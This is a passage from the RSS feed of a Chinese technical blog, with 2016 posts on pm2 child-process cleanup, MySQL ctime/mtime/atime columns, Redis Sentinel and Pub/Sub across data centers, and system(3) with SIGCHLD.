上面的脚本不断读取 run.log，将上传的文件路径名提取出来，然后传给文件扫描程序（./tools/file-scan），扫描成功日志文件为 ./tools/file-scan-successed.log，扫描失败日志文件为 ./tools/file-scan-failed.log。
</p>

<p>
现在在尝试启动进程
</p>

<div class="org-src-container">
<pre class="src src-sh">pm2 start process.json
</pre>
</div>

<p>
查看进程运行状态
</p>

<div class="org-src-container">
<pre class="src src-sh">pm2 list
</pre>
</div>

<p>
然后尝试重启
</p>

<div class="org-src-container">
<pre class="src src-sh">pm2 restart process.json
</pre>
</div>

<p>
发现后台有两个 <code>file-scan</code> 及 <code>tail -f ./run.log</code> 进程，restart 没有将子进程杀死，不过父进程 /bin/bash 进程倒是杀死了。
</p>

<p>
估计是 bash 使用 pm2 fork-mode 运行后，其终端被 detach 了，相当于是后台 daemon 进程，bash 进程死掉后， <code>tail -f ./run.log</code> 进程收不到 SIGHUP 信号也就没有跟着退出。
</p>

<p>
可以利用 tail 命令的参数 <code>-pid</code> ，指定 bash 结束时中断 <code>tail -f</code> 命令
</p>

<p>
<code>man tail</code>
</p>
<blockquote>
<p>
&#x2013;pid=PID
       with -f, terminate after process ID, PID dies  
</p>
</blockquote>

<p>
将 run-log-analyze.sh 改写如下
</p>

<div class="org-src-container">
<pre class="src src-sh">tail -f --pid=$<span style="color: #f0c674;">$</span> ./run.log | bunyan --strict -c <span style="color: #8abeb7;">'this.msg == "file uploaded"'</span> -0<span style="text-decoration: underline;"> | json -ga file | ./tools/file-scan -o ./tools/file-scan-successed.log -e ./tools/file-scan-failed.log</span>
</pre>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[mysql 实现 ctime、mtime、atime 语义]]></title>
            <link>/article/mysql-5b9e73b0-ctime-3001-mtime-3001-atime-8bed4e49.html</link>
            <guid>/article/mysql-5b9e73b0-ctime-3001-mtime-3001-atime-8bed4e49.html</guid>
            <pubDate>Fri, 26 Aug 2016 11:18:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
事物有常见的三个时间属性
</p>

<ul class="org-ul">
<li>创建时间（ctime）</li>
</ul>


<ul class="org-ul">
<li>修改时间（mtime）</li>
</ul>


<ul class="org-ul">
<li>访问时间（atime）</li>
</ul>


<p>
下面考虑使用 mysql 实现。
</p>

<div id="outline-container-org8338f11" class="outline-2">
<h2 id="org8338f11">不要使用 REPLACE</h2>
<div class="outline-text-2" id="text-org8338f11">
<p>
<a href="http://dev.mysql.com/doc/refman/5.7/en/replace.html">MySQL :: MySQL 5.7 Reference Manual :: 14.2.8 REPLACE Syntax</a>
</p>
<blockquote>
<p>
REPLACE 像 INSERT 一样运作，除了：表中的旧记录与新记录的主键（PRIMARY KEY）或唯一索引（UNIQUE index）一样时，删掉旧记录再插入新记录。 
</p>

<p>
REPLACE works exactly like INSERT, except that if an old row in the table has the same value as a new row for a PRIMARY KEY or a UNIQUE index, the old row is deleted before the new row is inserted. 
</p>
</blockquote>

<p>
这就意味着默认值定义为 <code>DEFAULT CURRENT_TIMESTAMP</code> 的字段，在缺失的情况下会重置为当前时间（CURRENT_TIMESTAMP）。
</p>
</div>

<div id="outline-container-org320f3bd" class="outline-3">
<h3 id="org320f3bd">自行实现创建或修改语义</h3>
<div class="outline-text-3" id="text-org320f3bd">
<p>
更新（UPDATE）记录，如果 <code>affectedRows</code> 为 0，再尝试插入（INSERT）记录。
</p>

<p>
由于更新（UPDATE）和插入（INSERT）是两个操作，并发访问的情况下，插入（INSERT）时记录可以已要存在，因此还需要忽略主键冲突错误。
</p>
</div>
</div>
</div>

<div id="outline-container-org045bd5f" class="outline-2">
<h2 id="org045bd5f">不要使用 ON UPDATE CURRENT_TIMESTAMP</h2>
<div class="outline-text-2" id="text-org045bd5f">
<p>
这里的 <code>UPDATE</code> 是指更新语句（UPDATE、INSERT、REPLACE）是否改动了记录内容，
新值与旧值不一样表示记录内容变化，会更新字段值为当前时间，否则，不会更新字段值为当前时间。
</p>

<p>
可在更新语句中设置字段值为 <code>CURRENT_TIMESTAMP</code> ，强制字段值总是更新为当前时间。
</p>

<p>
另外，更新访问时间（atime）时，会导致使用了 <code>ON UPDATE CURRENT_TIMESTAMP</code> 的字段更新为当前时间。
</p>
</div>
</div>

<div id="outline-container-orgb65a42f" class="outline-2">
<h2 id="orgb65a42f">创建时间（ctime）</h2>
<div class="outline-text-2" id="text-orgb65a42f">
</div>
<div id="outline-container-org42b6a53" class="outline-3">
<h3 id="org42b6a53">字段定义</h3>
<div class="outline-text-3" id="text-org42b6a53">
<pre class="example">
ctime TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
</pre>

<p>
指定默认值为当前时间，在记录创建时自动设置。
</p>
</div>
</div>
</div>

<div id="outline-container-orgf3c4a8f" class="outline-2">
<h2 id="orgf3c4a8f">字段值更新</h2>
<div class="outline-text-2" id="text-orgf3c4a8f">
<p>
INSERT（或 UPDATE） 语句创建（或更新）记录，不指定 <code>ctime</code> 字段。
</p>
</div>
</div>

<div id="outline-container-org20af5d0" class="outline-2">
<h2 id="org20af5d0">更新时间（mtime）</h2>
<div class="outline-text-2" id="text-org20af5d0">
</div>
<div id="outline-container-org57d6f8b" class="outline-3">
<h3 id="org57d6f8b">字段定义</h3>
<div class="outline-text-3" id="text-org57d6f8b">
<pre class="example">
mtime TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
</pre>

<p>
指定默认值为当前时间，在记录创建时自动设置。
</p>
</div>
</div>
</div>

<div id="outline-container-org9c01fb4" class="outline-2">
<h2 id="org9c01fb4">字段值更新</h2>
<div class="outline-text-2" id="text-org9c01fb4">
<p>
INSERT 语句创建记录，不指定 <code>mtime</code> 字段，或指定字段值为 CURRENT_TIMESTAMP。
</p>

<p>
UPDATE 语句更新记录，指定 <code>mtime</code> 字段值为 CURRENT_TIMESTAMP。
</p>
</div>
</div>

<div id="outline-container-org86ddfea" class="outline-2">
<h2 id="org86ddfea">访问时间（atime）</h2>
<div class="outline-text-2" id="text-org86ddfea">
</div>
<div id="outline-container-org70cdc87" class="outline-3">
<h3 id="org70cdc87">字段定义</h3>
<div class="outline-text-3" id="text-org70cdc87">
<pre class="example">
atime TIMESTAMP NOT NULL DEFAULT "0000-00-00 00:00:00"
</pre>

<p>
指定默认值为空时间值（表示未访问），在记录创建时自动设置。
</p>
</div>
</div>
</div>

<div id="outline-container-org06f3f2f" class="outline-2">
<h2 id="org06f3f2f">字段值更新</h2>
<div class="outline-text-2" id="text-org06f3f2f">
<p>
UPDATE 语句更新记录，指定 <code>atime</code> 字段值为 CURRENT_TIMESTAMP。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Redis Sentinel 多机房部署方案]]></title>
            <link>/article/redis-sentinel-591a673a623f90e87f7265b96848.html</link>
            <guid>/article/redis-sentinel-591a673a623f90e87f7265b96848.html</guid>
            <pubDate>Sat, 20 Aug 2016 14:20:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgd675a3c" class="outline-2">
<h2 id="orgd675a3c">减少或避免跨机房 Redis 访问的好处</h2>
<div class="outline-text-2" id="text-orgd675a3c">
<ul class="org-ul">
<li><p>
减少跨机房网络流量
</p>

<p>
很多机房外网流量是有限制的，外网流量过高会影响整个服务的稳定性，甚至拒绝服务。
</p></li>

<li><p>
更快的响应速度
</p>

<p>
跨机房网络传输的网络延时很高。
</p></li>

<li><p>
更安全
</p>

<p>
Redis 本身的安全机制很薄弱，目前只支持明文密码验证，依靠 iptables 进行访问限制，运维成本高。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgfc4e79e" class="outline-2">
<h2 id="orgfc4e79e">如何减少或避免应用的跨机房访问</h2>
<div class="outline-text-2" id="text-orgfc4e79e">
</div>
<div id="outline-container-org41e41ca" class="outline-3">
<h3 id="org41e41ca">单维的数据模型</h3>
<div class="outline-text-3" id="text-org41e41ca">
<p>
如果整个应用的数据集是单维度的，即基于同一主键，按主键进行数据分片（Sharding）后，同一主键所属的数据会处于同一分片（Shard），按主键访问时是无共享（shared-nothing）的，可以水平无限扩容。
</p>
</div>
</div>

<div id="outline-container-org6c34aa2" class="outline-3">
<h3 id="org6c34aa2">多维的数据模型</h3>
<div class="outline-text-3" id="text-org6c34aa2">
<p>
如果整个应用的数据集是多维度的，按一个维度进行数据分片（Sharding）后，按另一维度获取数据时，需要同时访问多个分片（Shard）。
</p>
</div>
</div>

<div id="outline-container-orgc0e9b22" class="outline-3">
<h3 id="orgc0e9b22">以博客应用为例</h3>
<div class="outline-text-3" id="text-orgc0e9b22">
<p>
文章的模型定义如下
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Field</th>
<th scope="col" class="org-left">Type</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">id</td>
<td class="org-left">Number</td>
</tr>

<tr>
<td class="org-left">title</td>
<td class="org-left">String</td>
</tr>

<tr>
<td class="org-left">author</td>
<td class="org-left">Number</td>
</tr>

<tr>
<td class="org-left">content</td>
<td class="org-left">String</td>
</tr>
</tbody>
</table>

<p>
按 id 进行数据分片（Sharding），id 为寄数保存到 Shard 1，id 为 偶数保存到 Shard 2，
按 id 访问文章时，计算 id 对应的分片（Shard），从分片获得文章数据。
还可以在模型中添加冗余字段（如：author_name），方便显示作者名称，省去一次关联查询。
</p>


<p>
要获取 author 的文章列表，则需要在文章发布时按 author 索引文章，模型定义如下
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Field</th>
<th scope="col" class="org-left">Type</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">id</td>
<td class="org-left">Number</td>
</tr>

<tr>
<td class="org-left">name</td>
<td class="org-left">String</td>
</tr>

<tr>
<td class="org-left">articles</td>
<td class="org-left">Set</td>
</tr>
</tbody>
</table>

<p>
按 id 进行数据分片（Sharding），id 为寄数保存到 Shard 1，id 为 偶数保存到 Shard 2，
按 id 访问作者时，计算 id 对应的分片（Shard），从分片获得作者数据。
</p>


<p>
当应用逻辑很简单的时候（如：根据文章 id 展示文章、展示作者的文章列表），结合冗余字段，我们可以做到只从一个数据分区（Shard）中取得数据。但是发表文章时，则一定要同时更新多个分区（Shard）中的数据。
</p>


<p>
我们之所以如此介意跨分区（Shard）数据访问，是因为有可能两个分区（Shard）相隔甚远（如：部署在横跨大陆的多个数据中心），更高的延迟、费用，更低的稳定性，同时也会引入分布式系统带来的复杂性。
</p>

<p>
现实中有价值的应用服务，往往比较复杂，都是多维的数据模型，跨分区（机房）数据访问避无可避。
</p>
</div>
</div>

<div id="outline-container-orgb7dba4d" class="outline-3">
<h3 id="orgb7dba4d">跨机房交互形式</h3>
<div class="outline-text-3" id="text-orgb7dba4d">
<ul class="org-ul">
<li><p>
管它跨不跨机房
</p>

<p>
一开始应用可能是部署在一个机房里，随着规模的扩大或者需要满足异地灾备，将一部分模块移到另一个机房，模块间的交互从内网移到了外网。以前在内网的时候，网络传输是很快的，设计的接口粒度很细，迁移到外网跨机房环境下，性能以及稳定性可能会无法接受，最终要不断地进行优化。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
重定向客户端请求到数据所属的机房
</p>

<p>
如通过 HTTP 302 指示客户端（通常是浏览器）跳转到数据所属机房的域名（或 IP）。
会增加客户端开发的复杂性，很多逻辑需要放在客户端来完成，能够将机房外网流量尽量减少。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
代客户端进行跨机房请求
</p>

<p>
如代理发起 HTTP 请求（或内部通信机制，如：消息队列）到所属机房的域名（或 IP），并转发响应给客户端。
会增加后台应用开发的复杂性，如果应用有内置的内部通信机制（如：消息队列）复杂性还是可以接受的，会增加机房的外网流量，只能算是一种过渡方案。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
支持跨机房访问但引导客户端访问正确的数据中心
</p>

<p>
用户请求涉及的部分数据如果在另一机房，则直接跨机房访问，如同数据在本机房一样进行处理，并在响应中指示客户端下次到另一机房进行访问。后台应用和客户端的开发不会过度复杂，通过引导客户端访问正确的数据中心进行优化。
</p></li>
</ul>
</div>
</div>
</div>

<div id="outline-container-org22751e7" class="outline-2">
<h2 id="org22751e7">协调访问数据分片</h2>
<div class="outline-text-2" id="text-org22751e7">
<p>
假设数据按照主键的 hash 值进行取模分片（Sharding），数据与分片（Shard）的对应关系对应如下：
</p>

<pre class="example">
shard = hash(key) % count(shards)
</pre>


<p>
多机房下的数据分片（Sharding）需具备以下特性：
</p>

<ol class="org-ol">
<li>数据片（Shard）一定会处于某一机房，但不可同时处于多个机房</li>

<li>数据片（Shard）所属机房如果挂了，其它机房的复本之一会被激活，数据片（Shard）重新可用</li>

<li>除非所有机房都挂了，否则数据应该总是可用的（Availability）</li>
</ol>

<p>
以上三点可由 Redis Sentinel 保证。
</p>

<p>
Redis Sentinel 以星状组织 Redis 结点拓扑，对于多数据中心部署的 Redis 集群，结点超过 2 个时可能会导致机房间流量暴涨（如：需要从一个机房的 Master 同步多份数据到另一个机房的多个 Slave）。
所以，最好把数据集切分得更细一些，直到一组 Redis 实例（即 1 Master + 1 Slave）即可容纳并可满足客户端请求。
</p>

<p>
直接访问 Redis 往往是耦合度很高的一种形式，Redis 中的数据是所有服务结点共享访问的，访问冲突和状态不一致可能会导致业务出错。
</p>

<p>
我们希望机房间除了 Redis 的 Master-Slave 间的数据同步之外不再有其它的交互，最好不要有应用（Application）跨机房操作 Redis 以实现业务逻辑的情况发生。
</p>


<div class="figure">
<p><img src="../static/redis-restrict_cross_datacenter_flow.png" alt="redis-restrict_cross_datacenter_flow.png" />
</p>
</div>

<p>
如何在限制跨机房 Redis 访问的情况下实现业务逻辑呢？
</p>

<ul class="org-ul">
<li><p>
重定向客户端请求到数据所属的机房
</p>

<p>
后端服务结点知道哪个数据中心更适合处理用户的请求，向客户端发出重定向指示即可，不需要耗费其它资源。
</p></li>

<li><p>
通过跨机房交互满足客户端请求
</p>

<p>
完成请求需要与另一机房的服务交互，如通过调用服务接口（如：Restful API）的形式，完成整个业务逻辑处理。
也可以将客户端的请求转发到另一机房服务，并将响应发回客户端，相当于是内置了服务代理（Proxy）功能。
</p></li>
</ul>


<p>
由此可见，不跨机房访问 Redis 这份美好是有代价的，客户端和服务器端的业务逻辑会更复杂，客户端或服务器端需要针对跨机房的数据进行特殊处理。
</p>

<p>
通过选择正确的数据分片（Sharding）方式，确保主要或高频次的客户端请求能够在同一数据中心内完成。次要或低频次的客户端请求允许跨数据中心，通过在本地数据中心部署其它数据中心的复本（Slave）的方式，将跨数据中心"读"转化为本地"读"，少量的跨数据中心"写"不成问题。
</p>

<p>
如下图所示
<img src="../static/redis-embrace_cross_datacenter_flow.png" alt="redis-embrace_cross_datacenter_flow.png" />
Redis Group 1 存储主要或高频次的数据，Redis Group 2 存储次要或低频次的数据。
</p>

<p>
客户端通过 DataCenter 1 访问本地的 Redis Group 1 属于合理的访问。
业务逻辑可能需要访问 Redis Group 2，读操作可以发往本地的 Redis Group 2 Slave，写操作要跨机房访问 DataCenter 2 中的 Redis Group 2 Master（应该尽量减少）。
</p>

<p>
客户端通过 DataCenter 2 访问本地的 Redis Group 2 属于合理的访问。
业务逻辑主要需要访问 Redis Group 1，读操作可以发往本地的 Redis Group 1 Slave，写操作需要跨机房访问 DataCenter 1 中的 Redis Group 1 Master，
这是不合理的，因此在发给客户端的响应中指示客户端下次将请求发往 Redis Group 1 Master 所在的 DataCenter 1。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Redis Pub/Sub 多机房部署]]></title>
            <link>/article/redis-pub-sub-591a673a623f90e87f72.html</link>
            <guid>/article/redis-pub-sub-591a673a623f90e87f72.html</guid>
            <pubDate>Thu, 18 Aug 2016 06:18:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org01a45fc" class="outline-2">
<h2 id="org01a45fc">由于 Master 上 Publish 的消息会自动同步到所有 Slaves，Redis Pub/Sub 很容易扩展</h2>
<div class="outline-text-2" id="text-org01a45fc">
<blockquote>
<p>
Redis PubSub scales really easily since the Master/Slave replication automatically publishes to all slaves.
</p>
</blockquote>
<p>
引用自 <a href="http://stackoverflow.com/a/6512308/802708">Redis PUBLISH/SUBSCRIBE limits - Stack Overflow</a>
</p>
</div>
</div>

<div id="outline-container-orgf51f906" class="outline-2">
<h2 id="orgf51f906">可以在 Master 上 Publish 消息，然后在 Slave 上 Subscribe 消息，反之不行</h2>
<div class="outline-text-2" id="text-orgf51f906">
<blockquote>
<p>
With replication in-place the  publisher can publish in the master host and the subscribers can subscribe to the slave host.
</p>

<p>
It is important to mention that this relationship is one-way. Master –&gt; Slave relationship are unidirectional. It is impossible to publish to the slave and subscribe to the master.
</p>

<p>
&#x2026;
</p>

<p>
The conclusion is simple: Two ways pub/sub channels across servers require at least 4 Redis hosts.
</p>
</blockquote>
<p>
引用自 <a href="http://blogs.microsoft.co.il/applisec/2013/09/11/pub-sub-across-servers-using-redis/">Pub Sub Across Servers Using Redis | Manu Cohen-Yashar's Blog</a>
</p>

<p>
需要注意的是，Slave 虽然不可写（Readonly），但是照样可以 Pub/Sub，
只是 Publish 的消息不会同步到 Master，所以不会被 Master 上的 Subscriber 接收到，
但是 Slave 自身的 Subscriber 仍工作正常。
</p>
</div>
</div>

<div id="outline-container-orgf171e81" class="outline-2">
<h2 id="orgf171e81">多机房部署的情况下，2 个 Redis 实例可实现双向通讯</h2>
<div class="outline-text-2" id="text-orgf171e81">
<p>
<img src="../static/redis-pub_sub_multi_datacenter-2.png" alt="redis-pub_sub_multi_datacenter-2.png" />
但是比较低效，Master 所在机房 Publish 的消息会在机房间传输一次（Sync 一次），
Slave 所在机房 Publish 的消息会在机房间传输两次（Send、Sync 各一次），
而且 Slave 机房部署的应用需要跨机房直接连接到 Master 才能进行 Publish。
</p>
</div>
</div>


<div id="outline-container-orgc3462d6" class="outline-2">
<h2 id="orgc3462d6">多机房部署的情况下，4 个 Redis 实例可以实现高效的双向通讯</h2>
<div class="outline-text-2" id="text-orgc3462d6">
<p>
<img src="../static/redis-pub_sub_multi_datacenter-4.png" alt="redis-pub_sub_multi_datacenter-4.png" />
每一次 Publish 的消息会在机房间传输一次，机房间只有 Master/Slave 同步流量。
</p>
</div>
</div>

<div id="outline-container-org7331ff4" class="outline-2">
<h2 id="org7331ff4">Pub/Sub 跨机房部署带来的问题</h2>
<div class="outline-text-2" id="text-org7331ff4">
</div>
<div id="outline-container-org9c99ff8" class="outline-3">
<h3 id="org9c99ff8">从 Slave Subscribe 消息后，消息 Publish 一方无法获知 Subscriber 数量</h3>
<div class="outline-text-3" id="text-org9c99ff8">
<pre class="example">
<span class="linenr"> 1: </span># Publish to master, subscribe from master.
<span class="linenr"> 2: </span>$ redis-cli -h master.local subscribe test &amp;
<span class="linenr"> 3: </span>[1] 20590
<span class="linenr"> 4: </span>$ Reading messages... (press Ctrl-C to quit)
<span class="linenr"> 5: </span>1) "subscribe"
<span class="linenr"> 6: </span>2) "test"
<span class="linenr"> 7: </span>3) (integer) 1
<span class="linenr"> 8: </span>$ 
<span class="linenr"> 9: </span>$ redis-cli -h master.local  publish test "hello from master"
<span class="linenr">10: </span>1) "message"
<span class="linenr">11: </span>2) "test"
<span class="linenr">12: </span>3) "hello from master"
<span id="coderef-subscribers_on_master_perceptible" class="coderef-off"><span class="linenr">13: </span>(integer) 1</span>
<span class="linenr">14: </span>$ fg
<span class="linenr">15: </span>redis-cli subscribe test
<span class="linenr">16: </span>  C-c C-c
<span class="linenr">17: </span>$ 
<span class="linenr">18: </span># Publish to master, subscribe from slave.
<span class="linenr">19: </span>$ redis-cli -h slave.local -p 6380 subscribe test &amp;
<span class="linenr">20: </span>[1] 20592
<span class="linenr">21: </span>$ Reading messages... (press Ctrl-C to quit)
<span class="linenr">22: </span>1) "subscribe"
<span class="linenr">23: </span>2) "test"
<span class="linenr">24: </span>3) (integer) 1
<span class="linenr">25: </span>$ 
<span class="linenr">26: </span>$ redis-cli -h master.local publish test "hello from master"
<span id="coderef-subscribers_on_slave_nonperceptible" class="coderef-off"><span class="linenr">27: </span>(integer) 0</span>
<span class="linenr">28: </span>1) "message"
<span class="linenr">29: </span>2) "test"
<span class="linenr">30: </span>3) "hello from master"
<span class="linenr">31: </span>$ 
</pre>

<ul class="org-ul">
<li><p>
行 <a href="#coderef-subscribers_on_master_perceptible" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-subscribers_on_master_perceptible');" onmouseout="CodeHighlightOff(this, 'coderef-subscribers_on_master_perceptible');">13</a>
</p>

<p>
在 Master 上订阅时，发布方得知的订阅者人数为 1
</p></li>

<li><p>
行 <a href="#coderef-subscribers_on_slave_nonperceptible" class="coderef" onmouseover="CodeHighlightOn(this, 'coderef-subscribers_on_slave_nonperceptible');" onmouseout="CodeHighlightOff(this, 'coderef-subscribers_on_slave_nonperceptible');">27</a>
</p>

<p>
在 Slave 上订阅时，发布方得知的订阅者人数为 0</p></li>
</ul>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Redis Sentinel 多机房部署注意事项]]></title>
            <link>/article/redis-sentinel-591a673a623f90e87f726ce8610f4e8b9879.html</link>
            <guid>/article/redis-sentinel-591a673a623f90e87f726ce8610f4e8b9879.html</guid>
            <pubDate>Mon, 15 Aug 2016 07:03:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org52f48b5" class="outline-2">
<h2 id="org52f48b5">级连同步失效</h2>
<div class="outline-text-2" id="text-org52f48b5">
<p>
级连同步的描述（摘自 <a href="http://redis.io/topics/replication">Replication – Redis</a>）：
</p>
<blockquote>
<p>
Slaves are able to accept connections from other slaves. Aside from connecting a
number of slaves to the same master, slaves can also be connected to other slaves in
a cascading-like structure.
</p>
</blockquote>

<p>
由此可见级连同步可减轻 Master 的流量。
</p>

<p>
假设 DataCenter 2 上的两个 Slave 从 DataCenter 1 上的 Master 进行同步，会导致 DataCenter 1 要流出两份流量到 DataCenter 2，开启级连同步（DataCenter 2 上的其中一个 Slave 从另一个 Slave 上进行同步）后，DataCenter 1 只需同步一份流量到 DataCenter2。
</p>

<p>
Sentinel 以星状组织 Redis 结点，无法发现二级 Slave（Slave 上连接的其它 Slave），也就无法将二级 Slave 信息提供给客户端应用进行访问，应用需要自行连上二级 Slave。另外，一级 Slave 被 Sentinel 切为 Master 后，二级 Slave 将转化为一级 Slave ，从而被 Sentinel 发现。
</p>


<div class="figure">
<p><img src="../static/redis-sentinel_slave_of_slave.png" alt="redis-sentinel_slave_of_slave.png" />
</p>
</div>

<p>
当 Fail-Over 发生后级连同步会失效，Redis Sentinel 不支持级连同步
</p>
<blockquote>
<p>
Aside from this problems, there is also the problem that for Sentinel
the role of an instance is the one published in INFO by the instance.
This means that you can't failover a slave that happens to be the
master of other chained instances. Also the chained instances will not
be detected, and if detected because of a temporary role change for
some reason, they'll be reconfigured to replicate with what Sentinel
believe to be the master.
Basically you can find your ways to make it working but currently the
support for chained replication in Sentinel is near zero.
</p>

<p>
Salvatore 
</p>
</blockquote>
<p>
引用自 <a href="https://groups.google.com/d/msg/redis-db/uMOIX3m3Is4/HWhYegU4OawJ">Sentinels in Multi Region configuration - Google 网上论坛</a>
</p>
</div>
</div>

<div id="outline-container-org330d505" class="outline-2">
<h2 id="org330d505">内网流量外网化</h2>
<div class="outline-text-2" id="text-org330d505">
<p>
跨机房部署就意味着需要跨机房同步或访问 Redis 数据，如果另一机房有多个 Slave，则会有多份流量，机房外网流量会相应增长，需要预先进行流量规划。
</p>


<p>
Redis 为内网部署提供了如下配置项
</p>

<ul class="org-ul">
<li><p>
Sentinel 的 announce-ip 和 announce-port 选项
</p>

<p>
要求 Redis 版本至少为 2.8，参见 <a href="https://raw.githubusercontent.com/antirez/redis/2.8/redis.conf">redis.conf</a>
</p></li>

<li><p>
Redis 的 slave-announce-ip 和 slave-announce-port 选项
</p>

<p>
要求 Redis 版本至少为 3.2，参见 <a href="https://raw.githubusercontent.com/antirez/redis/3.2/redis.conf">redis.conf</a>
</p></li>
</ul>

<p>
它们用于解决如下两个问题
</p>
<blockquote>
<p>
Remapping ports and addresses creates issues with Sentinel in two ways:
</p>

<ol class="org-ol">
<li>Sentinel auto-discovery of other Sentinels no longer works, since it is based on 
hello messages where each Sentinel announce at which port and IP address they are
listening for connection. However Sentinels have no way to understand that an address
or port is remapped, so it is announcing an information that is not correct for other
Sentinels to connect.</li>
<li>Slaves are listed in the INFO output of a Redis master in a similar way: the address
is detected by the master checking the remote peer of the TCP connection, while the
port is advertised by the slave itself during the handshake, however the port may be
wrong for the same reason as exposed in point 1.</li>
</ol>
</blockquote>
<p>
引用自 <a href="http://redis.io/topics/sentinel#sentinel-docker-nat-and-possible-issues">Redis Sentinel Documentation – Redis - Sentinel, Docker, NAT, and possible issues</a>
</p>


<p>
基于 Sentinel 的集群系统中，Redis 实例（角色可能为 Master、Slave 或 Sentinel）是通过 IP 和 PORT 标识的。
</p>

<ul class="org-ul">
<li><p>
Master
</p>

<p>
自身监听的 IP 和 PORT 并不重要，只要 Slave 和 Sentinel 能够连上即可，所以往往在所有 IP 上进行监听。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
Slave
</p>

<p>
Slave 配置中指定的 Master 结点 IP 是关键所在。
</p>

<p>
Slave 建立到 Master 的 TCP 连接时，Master 获取到的对端 IP 和 PORT 标识该 Slave，在 Master 的 INFO 命令中体现。
</p>

<p>
Slave 连接的 Master IP，经由路由规则，也就决定了 Master 看到的是 Slave 的哪一个 IP。
</p>

<p>
可以通过 slave-announce-ip 和 slave-announce-port 配置项强制指定。
</p></li>

<li><p>
Sentinel
</p>

<p>
Sentinel 配置中指定的 Master 结点 IP 是关键所在。
</p>

<p>
Sentinel 建立到 Master 的 TCP 连接后，调用 <code>getsockname</code> 从 fd 中取得本地 IP，PORT 则为配置的监听端口，并通过 PUBLISH Hello 消息告知其它 Sentinel。
</p>

<p>
Sentinel 连接的 Master IP，经由路由规则，也就决定了 Sentinel 看到的自身 IP。
</p>

<p>
可以通过 announce-ip 和 announce-port 配置项强制指定。
</p></li>
</ul>

<p>
DataCenter 2 上部署的应用会通过 Sentinel 获取到 DataCenter 1 上的结点（角色可能为 Master、Slave 或 Sentinel）信息，然后连接、访问，所以 Redis 实例（角色可能为 Master、Slave 或 Sentinel）都至少需要监听外网 IP。
</p>

<p>
通过外网 IP 访问同机房内结点，不会导致流量外网化，上级交换机识别到目标 IP 就在网络内，走的还是内网。
</p>

<p>
应用程序从 Sentinel 获取 Slave 列表后，最好优先连接同一数据中心的 Slave 结点。
</p>
</div>
</div>

<div id="outline-container-orgfb54aee" class="outline-2">
<h2 id="orgfb54aee">相关资源</h2>
<div class="outline-text-2" id="text-orgfb54aee">
<ul class="org-ul">
<li><a href="http://redis.io/topics/sentinel">Redis Sentinel Documentation – Redis</a></li>

<li><p>
<a href="https://groups.google.com/forum/#!searchin/redis-db/data$20center%7Csort:relevance/redis-db/o5afhx9Zn5E/DwQU3JLJJKgJ">Replication for read-scalability - Google 网上论坛</a>
</p>

<p>
通过公网跨数据中心复制数据相关的问题：安全、迟延等
</p></li>
</ul>


<ul class="org-ul">
<li><p>
<a href="https://groups.google.com/d/msg/redis-db/uMOIX3m3Is4/HWhYegU4OawJ">Sentinels in Multi Region configuration - Google 网上论坛</a>
</p>

<p>
Redis Sentinel 多数据中心配置问题
</p></li>
</ul>


<ul class="org-ul">
<li><p>
<a href="https://redislabs.com/ebook/redis-in-action/part-3-next-steps-3/chapter-10-scaling-redis/10-1-scaling-reads">Redis in Action - Scaling reads</a>
</p>

<p>
Redis 压缩、安全传输相关</p></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[system(3) 与 SIGCHLD 信号]]></title>
            <link>/article/system-3-4e0e-sigchld-4fe153f7.html</link>
            <guid>/article/system-3-4e0e-sigchld-4fe153f7.html</guid>
            <pubDate>Thu, 28 Jul 2016 03:44:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
system(3) 常用于执行 shell 命令
</p>

<div class="org-src-container">
<pre class="src src-c"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdlib.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdio.h&gt;</span>


<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">ret</span> = system(<span style="color: #8abeb7;">"ls -la"</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> printf(<span style="color: #8abeb7;">"ret: %d\n"</span>, ret);
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> ret;
}
</pre>
</div>

<p>
正常情况下，命令执行成功会返回 0。
</p>

<p>
system(3) 在执行的命令结束时会发出 SIGCHLD 信号，收到 SIGCHLD 信号的线程会从系统调用（如：read，write）中断返回，errno 为 EINTR（4: Interrupted system call）。
</p>

<p>
应用程序应该重试被中断的系统调用，但很多时候是通过第三方库间接进行系统调用，而这些库并未考虑周到，误以为系统调用失败。
</p>

<p>
